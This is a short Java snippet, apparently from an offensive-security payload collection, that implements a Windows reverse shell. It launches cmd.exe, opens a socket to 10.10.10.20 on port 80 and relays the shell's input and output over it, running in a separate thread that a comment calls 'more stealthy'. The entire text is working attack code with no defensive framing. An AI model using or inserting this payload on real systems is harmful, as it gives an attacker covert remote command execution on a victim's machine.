// reverse shell running inside a thread to be more stealthy
Thread thread = new Thread(){
    public void run(){
        Process proc = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
        Socket sock = new Socket("10.10.10.20", 80);
        InputStream pi=proc.getInputStream(), pe=proc.getErrorStream(), si=sock.getInputStream();
        OutputStream po=proc.getOutputStream(), so=sock.getOutputStream();

        while(!sock.isClosed()){
            while(pi.available()>0)so.write(pi.read());
            while(pe.available()>0)so.write(pe.read());
            while(si.available()>0)po.write(si.read());
            so.flush();
            po.flush();

            Thread.sleep(50);
            try {
                proc.exitValue();
                break;
            } catch (Exception e){}
        };
        proc.destroy();
        sock.close();
    }
}
thread.start();